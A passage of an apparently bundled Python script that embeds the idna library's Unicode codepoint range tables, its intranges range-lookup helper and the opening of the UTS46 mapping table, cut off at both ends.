0xdd600000dd7,\n        0xdd800000de0,\n        0xde600000df0,\n        0xdf200000df4,\n        0xe0100000e33,\n        0xe3400000e3b,\n        0xe4000000e4f,\n        0xe5000000e5a,\n        0xe8100000e83,\n        0xe8400000e85,\n        0xe8600000e8b,\n        0xe8c00000ea4,\n        0xea500000ea6,\n        0xea700000eb3,\n        0xeb400000ebe,\n        0xec000000ec5,\n        0xec600000ec7,\n        0xec800000ece,\n        0xed000000eda,\n        0xede00000ee0,\n        0xf0000000f01,\n        0xf0b00000f0c,\n        0xf1800000f1a,\n        0xf2000000f2a,\n        0xf3500000f36,\n        0xf3700000f38,\n        0xf3900000f3a,\n        0xf3e00000f43,\n        0xf4400000f48,\n        0xf4900000f4d,\n        0xf4e00000f52,\n        0xf5300000f57,\n        0xf5800000f5c,\n        0xf5d00000f69,\n        0xf6a00000f6d,\n        0xf7100000f73,\n        0xf7400000f75,\n        0xf7a00000f81,\n        0xf8200000f85,\n        0xf8600000f93,\n        0xf9400000f98,\n        0xf9900000f9d,\n        0xf9e00000fa2,\n        0xfa300000fa7,\n        0xfa800000fac,\n        0xfad00000fb9,\n        0xfba00000fbd,\n        0xfc600000fc7,\n        0x10000000104a,\n        0x10500000109e,\n        0x10d0000010fb,\n        0x10fd00001100,\n        0x120000001249,\n        0x124a0000124e,\n        0x125000001257,\n        0x125800001259,\n        0x125a0000125e,\n        0x126000001289,\n        0x128a0000128e,\n        0x1290000012b1,\n        0x12b2000012b6,\n        0x12b8000012bf,\n        0x12c0000012c1,\n        0x12c2000012c6,\n        0x12c8000012d7,\n        0x12d800001311,\n        0x131200001316,\n        0x13180000135b,\n        0x135d00001360,\n        0x138000001390,\n        0x13a0000013f6,\n        0x14010000166d,\n        0x166f00001680,\n        0x16810000169b,\n        0x16a0000016eb,\n        0x16f1000016f9,\n        0x170000001716,\n        0x171f00001735,\n        0x174000001754,\n        0x17600000176d,\n        0x176e00001771,\n        0x177200001774,\n        0x1780000017b4,\n        0x17b6000017d4,\n        0x17d7000017d8,\n        0x17dc000017de,\n        0x17e0000017ea,\n        0x18100000181a,\n        0x182000001879,\n        0x1880000018ab,\n        0x18b0000018f6,\n        0x19000000191f,\n        0x19200000192c,\n        0x19300000193c,\n        0x19460000196e,\n        0x197000001975,\n        0x1980000019ac,\n        0x19b0000019ca,\n        0x19d0000019da,\n        0x1a0000001a1c,\n        0x1a2000001a5f,\n        0x1a6000001a7d,\n        0x1a7f00001a8a,\n        0x1a9000001a9a,\n        0x1aa700001aa8,\n        0x1ab000001abe,\n        0x1abf00001acf,\n        0x1b0000001b4d,\n        0x1b5000001b5a,\n        0x1b6b00001b74,\n        0x1b8000001bf4,\n        0x1c0000001c38,\n        0x1c4000001c4a,\n        0x1c4d00001c7e,\n        0x1cd000001cd3,\n        0x1cd400001cfb,\n        0x1d0000001d2c,\n        0x1d2f00001d30,\n        0x1d3b00001d3c,\n        0x1d4e00001d4f,\n        0x1d6b00001d78,\n        0x1d7900001d9b,\n        0x1dc000001e00,\n        0x1e0100001e02,\n        0x1e0300001e04,\n        0x1e0500001e06,\n        0x1e0700001e08,\n        0x1e0900001e0a,\n        0x1e0b00001e0c,\n        0x1e0d00001e0e,\n        0x1e0f00001e10,\n        0x1e1100001e12,\n        0x1e1300001e14,\n        0x1e1500001e16,\n        0x1e1700001e18,\n        0x1e1900001e1a,\n        0x1e1b00001e1c,\n        0x1e1d00001e1e,\n        0x1e1f00001e20,\n        0x1e2100001e22,\n        0x1e2300001e24,\n        0x1e2500001e26,\n        0x1e2700001e28,\n        0x1e2900001e2a,\n        0x1e2b00001e2c,\n        0x1e2d00001e2e,\n        0x1e2f00001e30,\n        0x1e3100001e32,\n        0x1e3300001e34,\n        0x1e3500001e36,\n        0x1e3700001e38,\n        0x1e3900001e3a,\n        0x1e3b00001e3c,\n        0x1e3d00001e3e,\n        0x1e3f00001e40,\n        0x1e4100001e42,\n        0x1e4300001e44,\n        0x1e4500001e46,\n        0x1e4700001e48,\n        0x1e4900001e4a,\n        0x1e4b00001e4c,\n        0x1e4d00001e4e,\n        0x1e4f00001e50,\n        0x1e5100001e52,\n        0x1e5300001e54,\n        0x1e5500001e56,\n        0x1e5700001e58,\n        0x1e5900001e5a,\n        0x1e5b00001e5c,\n        0x1e5d00001e5e,\n        0x1e5f00001e60,\n        0x1e6100001e62,\n        0x1e6300001e64,\n        0x1e6500001e66,\n        0x1e6700001e68,\n        0x1e6900001e6a,\n        0x1e6b00001e6c,\n        0x1e6d00001e6e,\n        0x1e6f00001e70,\n        0x1e7100001e72,\n        0x1e7300001e74,\n        0x1e7500001e76,\n        0x1e7700001e78,\n        0x1e7900001e7a,\n        0x1e7b00001e7c,\n        0x1e7d00001e7e,\n        0x1e7f00001e80,\n        0x1e8100001e82,\n        0x1e8300001e84,\n        0x1e8500001e86,\n        0x1e8700001e88,\n        0x1e8900001e8a,\n        0x1e8b00001e8c,\n        0x1e8d00001e8e,\n        0x1e8f00001e90,\n        0x1e9100001e92,\n        0x1e9300001e94,\n        0x1e9500001e9a,\n        0x1e9c00001e9e,\n        0x1e9f00001ea0,\n        0x1ea100001ea2,\n        0x1ea300001ea4,\n        0x1ea500001ea6,\n        0x1ea700001ea8,\n        0x1ea900001eaa,\n        0x1eab00001eac,\n        0x1ead00001eae,\n        0x1eaf00001eb0,\n        0x1eb100001eb2,\n        0x1eb300001eb4,\n        0x1eb500001eb6,\n        0x1eb700001eb8,\n        0x1eb900001eba,\n        0x1ebb00001ebc,\n        0x1ebd00001ebe,\n        0x1ebf00001ec0,\n        0x1ec100001ec2,\n        0x1ec300001ec4,\n        0x1ec500001ec6,\n        0x1ec700001ec8,\n        0x1ec900001eca,\n        0x1ecb00001ecc,\n        0x1ecd00001ece,\n        0x1ecf00001ed0,\n        0x1ed100001ed2,\n        0x1ed300001ed4,\n        0x1ed500001ed6,\n        0x1ed700001ed8,\n        0x1ed900001eda,\n        0x1edb00001edc,\n        0x1edd00001ede,\n        0x1edf00001ee0,\n        0x1ee100001ee2,\n        0x1ee300001ee4,\n        0x1ee500001ee6,\n        0x1ee700001ee8,\n        0x1ee900001eea,\n        0x1eeb00001eec,\n        0x1eed00001eee,\n        0x1eef00001ef0,\n        0x1ef100001ef2,\n        0x1ef300001ef4,\n        0x1ef500001ef6,\n        0x1ef700001ef8,\n        0x1ef900001efa,\n        0x1efb00001efc,\n        0x1efd00001efe,\n        0x1eff00001f08,\n        0x1f1000001f16,\n        0x1f2000001f28,\n        0x1f3000001f38,\n        0x1f4000001f46,\n        0x1f5000001f58,\n        0x1f6000001f68,\n        0x1f7000001f71,\n        0x1f7200001f73,\n        0x1f7400001f75,\n        0x1f7600001f77,\n        0x1f7800001f79,\n        0x1f7a00001f7b,\n        0x1f7c00001f7d,\n        0x1fb000001fb2,\n        0x1fb600001fb7,\n        0x1fc600001fc7,\n        0x1fd000001fd3,\n        0x1fd600001fd8,\n        0x1fe000001fe3,\n        0x1fe400001fe8,\n        0x1ff600001ff7,\n        0x214e0000214f,\n        0x218400002185,\n        0x2c3000002c60,\n        0x2c6100002c62,\n        0x2c6500002c67,\n        0x2c6800002c69,\n        0x2c6a00002c6b,\n        0x2c6c00002c6d,\n        0x2c7100002c72,\n        0x2c7300002c75,\n        0x2c7600002c7c,\n        0x2c8100002c82,\n        0x2c8300002c84,\n        0x2c8500002c86,\n        0x2c8700002c88,\n        0x2c8900002c8a,\n        0x2c8b00002c8c,\n        0x2c8d00002c8e,\n        0x2c8f00002c90,\n        0x2c9100002c92,\n        0x2c9300002c94,\n        0x2c9500002c96,\n        0x2c9700002c98,\n        0x2c9900002c9a,\n        0x2c9b00002c9c,\n        0x2c9d00002c9e,\n        0x2c9f00002ca0,\n        0x2ca100002ca2,\n        0x2ca300002ca4,\n        0x2ca500002ca6,\n        0x2ca700002ca8,\n        0x2ca900002caa,\n        0x2cab00002cac,\n        0x2cad00002cae,\n        0x2caf00002cb0,\n        0x2cb100002cb2,\n        0x2cb300002cb4,\n        0x2cb500002cb6,\n        0x2cb700002cb8,\n        0x2cb900002cba,\n        0x2cbb00002cbc,\n        0x2cbd00002cbe,\n        0x2cbf00002cc0,\n        0x2cc100002cc2,\n        0x2cc300002cc4,\n        0x2cc500002cc6,\n        0x2cc700002cc8,\n        0x2cc900002cca,\n        0x2ccb00002ccc,\n        0x2ccd00002cce,\n        0x2ccf00002cd0,\n        0x2cd100002cd2,\n        0x2cd300002cd4,\n        0x2cd500002cd6,\n        0x2cd700002cd8,\n        0x2cd900002cda,\n        0x2cdb00002cdc,\n        0x2cdd00002cde,\n        0x2cdf00002ce0,\n        0x2ce100002ce2,\n        0x2ce300002ce5,\n        0x2cec00002ced,\n        0x2cee00002cf2,\n        0x2cf300002cf4,\n        0x2d0000002d26,\n        0x2d2700002d28,\n        0x2d2d00002d2e,\n        0x2d3000002d68,\n        0x2d7f00002d97,\n        0x2da000002da7,\n        0x2da800002daf,\n        0x2db000002db7,\n        0x2db800002dbf,\n        0x2dc000002dc7,\n        0x2dc800002dcf,\n        0x2dd000002dd7,\n        0x2dd800002ddf,\n        0x2de000002e00,\n        0x2e2f00002e30,\n        0x300500003008,\n        0x302a0000302e,\n        0x303c0000303d,\n        0x304100003097,\n        0x30990000309b,\n        0x309d0000309f,\n        0x30a1000030fb,\n        0x30fc000030ff,\n        0x310500003130,\n        0x31a0000031c0,\n        0x31f000003200,\n        0x340000004dc0,\n        0x4e000000a48d,\n        0xa4d00000a4fe,\n        0xa5000000a60d,\n        0xa6100000a62c,\n        0xa6410000a642,\n        0xa6430000a644,\n        0xa6450000a646,\n        0xa6470000a648,\n        0xa6490000a64a,\n        0xa64b0000a64c,\n        0xa64d0000a64e,\n        0xa64f0000a650,\n        0xa6510000a652,\n        0xa6530000a654,\n        0xa6550000a656,\n        0xa6570000a658,\n        0xa6590000a65a,\n        0xa65b0000a65c,\n        0xa65d0000a65e,\n        0xa65f0000a660,\n        0xa6610000a662,\n        0xa6630000a664,\n        0xa6650000a666,\n        0xa6670000a668,\n        0xa6690000a66a,\n        0xa66b0000a66c,\n        0xa66d0000a670,\n        0xa6740000a67e,\n        0xa67f0000a680,\n        0xa6810000a682,\n        0xa6830000a684,\n        0xa6850000a686,\n        0xa6870000a688,\n        0xa6890000a68a,\n        0xa68b0000a68c,\n        0xa68d0000a68e,\n        0xa68f0000a690,\n        0xa6910000a692,\n        0xa6930000a694,\n        0xa6950000a696,\n        0xa6970000a698,\n        0xa6990000a69a,\n        0xa69b0000a69c,\n        0xa69e0000a6e6,\n        0xa6f00000a6f2,\n        0xa7170000a720,\n        0xa7230000a724,\n        0xa7250000a726,\n        0xa7270000a728,\n        0xa7290000a72a,\n        0xa72b0000a72c,\n        0xa72d0000a72e,\n        0xa72f0000a732,\n        0xa7330000a734,\n        0xa7350000a736,\n        0xa7370000a738,\n        0xa7390000a73a,\n        0xa73b0000a73c,\n        0xa73d0000a73e,\n        0xa73f0000a740,\n        0xa7410000a742,\n        0xa7430000a744,\n        0xa7450000a746,\n        0xa7470000a748,\n        0xa7490000a74a,\n        0xa74b0000a74c,\n        0xa74d0000a74e,\n        0xa74f0000a750,\n        0xa7510000a752,\n        0xa7530000a754,\n        0xa7550000a756,\n        0xa7570000a758,\n        0xa7590000a75a,\n        0xa75b0000a75c,\n        0xa75d0000a75e,\n        0xa75f0000a760,\n        0xa7610000a762,\n        0xa7630000a764,\n        0xa7650000a766,\n        0xa7670000a768,\n        0xa7690000a76a,\n        0xa76b0000a76c,\n        0xa76d0000a76e,\n        0xa76f0000a770,\n        0xa7710000a779,\n        0xa77a0000a77b,\n        0xa77c0000a77d,\n        0xa77f0000a780,\n        0xa7810000a782,\n        0xa7830000a784,\n        0xa7850000a786,\n        0xa7870000a789,\n        0xa78c0000a78d,\n        0xa78e0000a790,\n        0xa7910000a792,\n        0xa7930000a796,\n        0xa7970000a798,\n        0xa7990000a79a,\n        0xa79b0000a79c,\n        0xa79d0000a79e,\n        0xa79f0000a7a0,\n        0xa7a10000a7a2,\n        0xa7a30000a7a4,\n        0xa7a50000a7a6,\n        0xa7a70000a7a8,\n        0xa7a90000a7aa,\n        0xa7af0000a7b0,\n        0xa7b50000a7b6,\n        0xa7b70000a7b8,\n        0xa7b90000a7ba,\n        0xa7bb0000a7bc,\n        0xa7bd0000a7be,\n        0xa7bf0000a7c0,\n        0xa7c10000a7c2,\n        0xa7c30000a7c4,\n        0xa7c80000a7c9,\n        0xa7ca0000a7cb,\n        0xa7d10000a7d2,\n        0xa7d30000a7d4,\n        0xa7d50000a7d6,\n        0xa7d70000a7d8,\n        0xa7d90000a7da,\n        0xa7f20000a7f5,\n        0xa7f60000a7f8,\n        0xa7fa0000a828,\n        0xa82c0000a82d,\n        0xa8400000a874,\n        0xa8800000a8c6,\n        0xa8d00000a8da,\n        0xa8e00000a8f8,\n        0xa8fb0000a8fc,\n        0xa8fd0000a92e,\n        0xa9300000a954,\n        0xa9800000a9c1,\n        0xa9cf0000a9da,\n        0xa9e00000a9ff,\n        0xaa000000aa37,\n        0xaa400000aa4e,\n        0xaa500000aa5a,\n        0xaa600000aa77,\n        0xaa7a0000aac3,\n        0xaadb0000aade,\n        0xaae00000aaf0,\n        0xaaf20000aaf7,\n        0xab010000ab07,\n        0xab090000ab0f,\n        0xab110000ab17,\n        0xab200000ab27,\n        0xab280000ab2f,\n        0xab300000ab5b,\n        0xab600000ab6a,\n        0xabc00000abeb,\n        0xabec0000abee,\n        0xabf00000abfa,\n        0xac000000d7a4,\n        0xfa0e0000fa10,\n        0xfa110000fa12,\n        0xfa130000fa15,\n        0xfa1f0000fa20,\n        0xfa210000fa22,\n        0xfa230000fa25,\n        0xfa270000fa2a,\n        0xfb1e0000fb1f,\n        0xfe200000fe30,\n        0xfe730000fe74,\n        0x100000001000c,\n        0x1000d00010027,\n        0x100280001003b,\n        0x1003c0001003e,\n        0x1003f0001004e,\n        0x100500001005e,\n        0x10080000100fb,\n        0x101fd000101fe,\n        0x102800001029d,\n        0x102a0000102d1,\n        0x102e0000102e1,\n        0x1030000010320,\n        0x1032d00010341,\n        0x103420001034a,\n        0x103500001037b,\n        0x103800001039e,\n        0x103a0000103c4,\n        0x103c8000103d0,\n        0x104280001049e,\n        0x104a0000104aa,\n        0x104d8000104fc,\n        0x1050000010528,\n        0x1053000010564,\n        0x10597000105a2,\n        0x105a3000105b2,\n        0x105b3000105ba,\n        0x105bb000105bd,\n        0x1060000010737,\n        0x1074000010756,\n        0x1076000010768,\n        0x1078000010786,\n        0x10787000107b1,\n        0x107b2000107bb,\n        0x1080000010806,\n        0x1080800010809,\n        0x1080a00010836,\n        0x1083700010839,\n        0x1083c0001083d,\n        0x1083f00010856,\n        0x1086000010877,\n        0x108800001089f,\n        0x108e0000108f3,\n        0x108f4000108f6,\n        0x1090000010916,\n        0x109200001093a,\n        0x10980000109b8,\n        0x109be000109c0,\n        0x10a0000010a04,\n        0x10a0500010a07,\n        0x10a0c00010a14,\n        0x10a1500010a18,\n        0x10a1900010a36,\n        0x10a3800010a3b,\n        0x10a3f00010a40,\n        0x10a6000010a7d,\n        0x10a8000010a9d,\n        0x10ac000010ac8,\n        0x10ac900010ae7,\n        0x10b0000010b36,\n        0x10b4000010b56,\n        0x10b6000010b73,\n        0x10b8000010b92,\n        0x10c0000010c49,\n        0x10cc000010cf3,\n        0x10d0000010d28,\n        0x10d3000010d3a,\n        0x10e8000010eaa,\n        0x10eab00010ead,\n        0x10eb000010eb2,\n        0x10f0000010f1d,\n        0x10f2700010f28,\n        0x10f3000010f51,\n        0x10f7000010f86,\n        0x10fb000010fc5,\n        0x10fe000010ff7,\n        0x1100000011047,\n        0x1106600011076,\n        0x1107f000110bb,\n        0x110c2000110c3,\n        0x110d0000110e9,\n        0x110f0000110fa,\n        0x1110000011135,\n        0x1113600011140,\n        0x1114400011148,\n        0x1115000011174,\n        0x1117600011177,\n        0x11180000111c5,\n        0x111c9000111cd,\n        0x111ce000111db,\n        0x111dc000111dd,\n        0x1120000011212,\n        0x1121300011238,\n        0x1123e0001123f,\n        0x1128000011287,\n        0x1128800011289,\n        0x1128a0001128e,\n        0x1128f0001129e,\n        0x1129f000112a9,\n        0x112b0000112eb,\n        0x112f0000112fa,\n        0x1130000011304,\n        0x113050001130d,\n        0x1130f00011311,\n        0x1131300011329,\n        0x1132a00011331,\n        0x1133200011334,\n        0x113350001133a,\n        0x1133b00011345,\n        0x1134700011349,\n        0x1134b0001134e,\n        0x1135000011351,\n        0x1135700011358,\n        0x1135d00011364,\n        0x113660001136d,\n        0x1137000011375,\n        0x114000001144b,\n        0x114500001145a,\n        0x1145e00011462,\n        0x11480000114c6,\n        0x114c7000114c8,\n        0x114d0000114da,\n        0x11580000115b6,\n        0x115b8000115c1,\n        0x115d8000115de,\n        0x1160000011641,\n        0x1164400011645,\n        0x116500001165a,\n        0x11680000116b9,\n        0x116c0000116ca,\n        0x117000001171b,\n        0x1171d0001172c,\n        0x117300001173a,\n        0x1174000011747,\n        0x118000001183b,\n        0x118c0000118ea,\n        0x118ff00011907,\n        0x119090001190a,\n        0x1190c00011914,\n        0x1191500011917,\n        0x1191800011936,\n        0x1193700011939,\n        0x1193b00011944,\n        0x119500001195a,\n        0x119a0000119a8,\n        0x119aa000119d8,\n        0x119da000119e2,\n        0x119e3000119e5,\n        0x11a0000011a3f,\n        0x11a4700011a48,\n        0x11a5000011a9a,\n        0x11a9d00011a9e,\n        0x11ab000011af9,\n        0x11c0000011c09,\n        0x11c0a00011c37,\n        0x11c3800011c41,\n        0x11c5000011c5a,\n        0x11c7200011c90,\n        0x11c9200011ca8,\n        0x11ca900011cb7,\n        0x11d0000011d07,\n        0x11d0800011d0a,\n        0x11d0b00011d37,\n        0x11d3a00011d3b,\n        0x11d3c00011d3e,\n        0x11d3f00011d48,\n        0x11d5000011d5a,\n        0x11d6000011d66,\n        0x11d6700011d69,\n        0x11d6a00011d8f,\n        0x11d9000011d92,\n        0x11d9300011d99,\n        0x11da000011daa,\n        0x11ee000011ef7,\n        0x11fb000011fb1,\n        0x120000001239a,\n        0x1248000012544,\n        0x12f9000012ff1,\n        0x130000001342f,\n        0x1440000014647,\n        0x1680000016a39,\n        0x16a4000016a5f,\n        0x16a6000016a6a,\n        0x16a7000016abf,\n        0x16ac000016aca,\n        0x16ad000016aee,\n        0x16af000016af5,\n        0x16b0000016b37,\n        0x16b4000016b44,\n        0x16b5000016b5a,\n        0x16b6300016b78,\n        0x16b7d00016b90,\n        0x16e6000016e80,\n        0x16f0000016f4b,\n        0x16f4f00016f88,\n        0x16f8f00016fa0,\n        0x16fe000016fe2,\n        0x16fe300016fe5,\n        0x16ff000016ff2,\n        0x17000000187f8,\n        0x1880000018cd6,\n        0x18d0000018d09,\n        0x1aff00001aff4,\n        0x1aff50001affc,\n        0x1affd0001afff,\n        0x1b0000001b123,\n        0x1b1500001b153,\n        0x1b1640001b168,\n        0x1b1700001b2fc,\n        0x1bc000001bc6b,\n        0x1bc700001bc7d,\n        0x1bc800001bc89,\n        0x1bc900001bc9a,\n        0x1bc9d0001bc9f,\n        0x1cf000001cf2e,\n        0x1cf300001cf47,\n        0x1da000001da37,\n        0x1da3b0001da6d,\n        0x1da750001da76,\n        0x1da840001da85,\n        0x1da9b0001daa0,\n        0x1daa10001dab0,\n        0x1df000001df1f,\n        0x1e0000001e007,\n        0x1e0080001e019,\n        0x1e01b0001e022,\n        0x1e0230001e025,\n        0x1e0260001e02b,\n        0x1e1000001e12d,\n        0x1e1300001e13e,\n        0x1e1400001e14a,\n        0x1e14e0001e14f,\n        0x1e2900001e2af,\n        0x1e2c00001e2fa,\n        0x1e7e00001e7e7,\n        0x1e7e80001e7ec,\n        0x1e7ed0001e7ef,\n        0x1e7f00001e7ff,\n        0x1e8000001e8c5,\n        0x1e8d00001e8d7,\n        0x1e9220001e94c,\n        0x1e9500001e95a,\n        0x1fbf00001fbfa,\n        0x200000002a6e0,\n        0x2a7000002b739,\n        0x2b7400002b81e,\n        0x2b8200002cea2,\n        0x2ceb00002ebe1,\n        0x300000003134b,\n    ),\n    'CONTEXTJ': (\n        0x200c0000200e,\n    ),\n    'CONTEXTO': (\n        0xb7000000b8,\n        0x37500000376,\n        0x5f3000005f5,\n        0x6600000066a,\n        0x6f0000006fa,\n        0x30fb000030fc,\n    ),\n}\n")
    __stickytape_write_module('idna/intranges.py', b'"""\nGiven a list of integers, made up of (hopefully) a small number of long runs\nof consecutive integers, compute a representation of the form\n((start1, end1), (start2, end2) ...). Then answer the question "was x present\nin the original list?" in time O(log(# runs)).\n"""\n\nimport bisect\nfrom typing import List, Tuple\n\ndef intranges_from_list(list_: List[int]) -> Tuple[int, ...]:\n    """Represent a list of integers as a sequence of ranges:\n    ((start_0, end_0), (start_1, end_1), ...), such that the original\n    integers are exactly those x such that start_i <= x < end_i for some i.\n\n    Ranges are encoded as single integers (start << 32 | end), not as tuples.\n    """\n\n    sorted_list = sorted(list_)\n    ranges = []\n    last_write = -1\n    for i in range(len(sorted_list)):\n        if i+1 < len(sorted_list):\n            if sorted_list[i] == sorted_list[i+1]-1:\n                continue\n        current_range = sorted_list[last_write+1:i+1]\n        ranges.append(_encode_range(current_range[0], current_range[-1] + 1))\n        last_write = i\n\n    return tuple(ranges)\n\ndef _encode_range(start: int, end: int) -> int:\n    return (start << 32) | end\n\ndef _decode_range(r: int) -> Tuple[int, int]:\n    return (r >> 32), (r & ((1 << 32) - 1))\n\n\ndef intranges_contain(int_: int, ranges: Tuple[int, ...]) -> bool:\n    """Determine if `int_` falls into one of the ranges in `ranges`."""\n    tuple_ = _encode_range(int_, 0)\n    pos = bisect.bisect_left(ranges, tuple_)\n    # we could be immediately ahead of a tuple (start, end)\n    # with start < int_ <= end\n    if pos > 0:\n        left, right = _decode_range(ranges[pos-1])\n        if left <= int_ < right:\n            return True\n    # or we could be immediately behind a tuple (int_, end)\n    if pos < len(ranges):\n        left, _ = _decode_range(ranges[pos])\n        if left == int_:\n            return True\n    return False\n')
    __stickytape_write_module('idna/uts46data.py', b'# This file is automatically generated by tools/idna-data\n# vim: set fileencoding=utf-8 :\n\nfrom typing import List, Tuple, Union\n\n\n"""IDNA Mapping Table from UTS46."""\n\n\n__version__ = \'14.0.0\'\ndef _seg_0() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x0, \'3\'),\n    (0x1, \'3\'),\n    (0x2, \'3\'),\n    (0x3, \'3\'),\n    (0x4, \'3\'),\n    (0x5, \'3\'),\n    (0x6, \'3\'),\n    (0x7, \'3\'),\n    (0x8, \'3\'),\n    (0x9, \'3\'),\n    (0xA, \'3\'),\n    (0xB, \'3\'),\n    (0xC, \'3\'),\n    (0xD, \'3\'),\n    (0xE, \'3\'),\n    (0xF, \'3\'),\n    (0x10, \'3\'),\n    (0x11, \'3\'),\n    (0x12, \'3\'),\n    (0x13, \'3\'),\n    (0x14, \'3\'),\n    (0x15, \'3\'),\n    (0x16, \'3\'),\n    (0x17, \'3\'),\n    (0x18, \'3\'),\n    (0x19, \'3\'),\n    (0x1A, \'3\'),\n    (0x1B, \'3\'),\n    (0x1C, \'3\'),\n    (0x1D, \'3\'),\n    (0x1E, \'3\'),\n    (0x1F, \'3\'),\n    (0x20, \'3\'),\n    (0x21, \'3\'),\n    (0x22, \'3\'),\n    (0x23, \'3\'),\n    (0x24, \'3\'),\n    (0x25, \'3\'),\n    (0x26, \'3\'),\n    (0x27, \'3\'),\n    (0x28, \'3\'),\n    (0x29, \'3\'),\n    (0x2A, \'3\'),\n    (0x2B, \'3\'),\n    (0x2C, \'3\'),\n    (0x2D, \'V\'),\n    (0x2E, \'V\'),\n    (0x2F, \'3\'),\n    (0x30, \'V\'),\n    (0x31, \'V\'),\n    (0x32, \'V\'),\n    (0x33, \'V\'),\n    (0x34, \'V\'),\n    (0x35, \'V\'),\n    (0x36, \'V\'),\n    (0x37, \'V\'),\n    (0x38, \'V\'),\n    (0x39, \'V\'),\n    (0x3A, \'3\'),\n    (0x3B, \'3\'),\n    (0x3C, \'3\'),\n    (0x3D, \'3\'),\n    (0x3E, \'3\'),\n    (0x3F, \'3\'),\n    (0x40, \'3\'),\n    (0x41, \'M\', \'a\'),\n    (0x42, \'M\', \'b\'),\n    (0x43, \'M\', \'c\'),\n    (0x44, \'M\', \'d\'),\n    (0x45, \'M\', \'e\'),\n    (0x46, \'M\', \'f\'),\n    (0x47, \'M\', \'g\'),\n    (0x48, \'M\', \'h\'),\n    (0x49, \'M\', \'i\'),\n    (0x4A, \'M\', \'j\'),\n    (0x4B, \'M\', \'k\'),\n    (0x4C, \'M\', \'l\'),\n    (0x4D, \'M\', \'m\'),\n    (0x4E, \'M\', \'n\'),\n    (0x4F, \'M\', \'o\'),\n    (0x50, \'M\', \'p\'),\n    (0x51, \'M\', \'q\'),\n    (0x52, \'M\', \'r\'),\n    (0x53, \'M\', \'s\'),\n    (0x54, \'M\', \'t\'),\n    (0x55, \'M\', \'u\'),\n    (0x56, \'M\', \'v\'),\n    (0x57, \'M\', \'w\'),\n    (0x58, \'M\', \'x\'),\n    (0x59, \'M\', \'y\'),\n    (0x5A, \'M\', \'z\'),\n    (0x5B, \'3\'),\n    (0x5C, \'3\'),\n    (0x5D, \'3\'),\n    (0x5E, \'3\'),\n    (0x5F, \'3\'),\n    (0x60, \'3\'),\n    (0x61, \'V\'),\n    (0x62, \'V\'),\n    (0x63, \'V\'),\n    ]\n\ndef _seg_1() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0x64, \'V\'),\n    (0x65, \'V\'),\n    (0x66, \'V\'),\n    (0x67, \'V\'),\n    (0x68, \'V\'),\n    (0x69, \'V\'),\n    (0x6A, \'V\'),\n    (0x6B, \'V\'),\n    (0x6C, \'V\'),\n    (0x6D, \'V\'),\n    (0x6E, \'V\'),\n    (0x6F, \'V\'),\n    (0x70, \'V\'),\n    (0x71, \'V\'),\n    (0x72, \'V\'),\n    (0x73, \'V\'),\n    (0x74, \'V\'),\n    (0x75, \'V\'),\n    (0x76, \'V\'),\n    (0x77, \'V\'),\n    (0x78, \'V\'),\n    (0x79, \'V\'),\n    (0x7A, \'V\'),\n    (0x7B, \'3\'),\n    (0x7C, \'3\'),\n    (0x7D, \'3\'),\n    (0x7E, \'3\'),\n    (0x7F, \'3\'),\n    (0x80, \'X\'),\n    (0x81, \'X\'),\n    (0x82, \'X\'),\n    (0x83, \'X\'),\n    (0x84, \'X\'),\n    (0x85, \'X\'),\n    (0x86, \'X\'),\n    (0x87, \'X\'),\n    (0x88, \'X\'),\n    (0x89, \'X\'),\n    (0x8A, \'X\'),\n    (0x8B, \'X\'),\n    (0x8C, \'X\'),\n    (0x8D, \'X\'),\n    (0x8E, \'X\'),\n    (0x8F, \'X\'),\n    (0x90, \'X\'),\n    (0x91, \'X\'),\n    (0x92, \'X\'),\n    (0x93, \'X\'),\n    (0x94, \'X\'),\n    (0x95, \'X\'),\n    (0x96, \'X\'),\n    (0x97, \'X\'),\n    (0x98, \'X\'),\n    (0x99, \'X\'),\n    (0x9A, \'X\'),\n    (0x9B, \'X\'),\n    (0x9C, \'X\'),\n    (0x9D, \'X\'),\n    (0x9E, \'X\'),\n    (0x9F, \'X\'),\n    (0xA0, \'3\', \' \'),\n    (0xA1, \'V\'),\n    (0xA2, \'V\'),\n    (0xA3, \'V\'),\n    (0xA4, \'V\'),\n    (0xA5, \'V\'),\n    (0xA6, \'V\'),\n    (0xA7, \'V\'),\n    (0xA8, \'3\', \' \xcc\x88\'),\n    (0xA9, \'V\'),\n    (0xAA, \'M\', \'a\'),\n    (0xAB, \'V\'),\n    (0xAC, \'V\'),\n    (0xAD, \'I\'),\n    (0xAE, \'V\'),\n    (0xAF, \'3\', \' \xcc\x84\'),\n    (0xB0, \'V\'),\n    (0xB1, \'V\'),\n    (0xB2, \'M\', \'2\'),\n    (0xB3, \'M\', \'3\'),\n    (0xB4, \'3\', \' \xcc\x81\'),\n    (0xB5, \'M\', \'\xce\xbc\'),\n    (0xB6, \'V\'),\n    (0xB7, \'V\'),\n    (0xB8, \'3\', \' \xcc\xa7\'),\n    (0xB9, \'M\', \'1\'),\n    (0xBA, \'M\', \'o\'),\n    (0xBB, \'V\'),\n    (0xBC, \'M\', \'1\xe2\x81\x844\'),\n    (0xBD, \'M\', \'1\xe2\x81\x842\'),\n    (0xBE, \'M\', \'3\xe2\x81\x844\'),\n    (0xBF, \'V\'),\n    (0xC0, \'M\', \'\xc3\xa0\'),\n    (0xC1, \'M\', \'\xc3\xa1\'),\n    (0xC2, \'M\', \'\xc3\xa2\'),\n    (0xC3, \'M\', \'\xc3\xa3\'),\n    (0xC4, \'M\', \'\xc3\xa4\'),\n    (0xC5, \'M\', \'\xc3\xa5\'),\n    (0xC6, \'M\', \'\xc3\xa6\'),\n    (0xC7, \'M\', \'\xc3\xa7\'),\n    ]\n\ndef _seg_2() -> List[Union[Tuple[int, str], Tuple[int, str, str]]]:\n    return [\n    (0xC8, \'M\', \'\xc3\xa8\'),\n    (0xC9, \'M\', \'\xc3\xa9\'),\n    (0xCA, \'M\', \'\xc3\xaa\'),\n    (0xCB, \'M\', \'\xc3\xab\'),\n    (0xCC, \'M\', \'\xc3\xac\'),\n    (0xCD, \'M\', \'\xc3\xad\'),\n    (0xCE, \'M\', \'\xc3\xae\'),\n    (0xCF, \'M\', \'\xc3\xaf\'),\n    (0xD0, \'M\', \'\xc3\xb0\'),\n    (0xD1, \'M\', \'\xc3\xb1\'),\n    (0xD2, \'M\', \'\xc3\xb2\'),\n    (0xD3, \'M\', \'\xc3\xb3\'),\n    (0xD4, \'M\', \'\xc3\xb4\'),\n    (0xD5, \'M\', 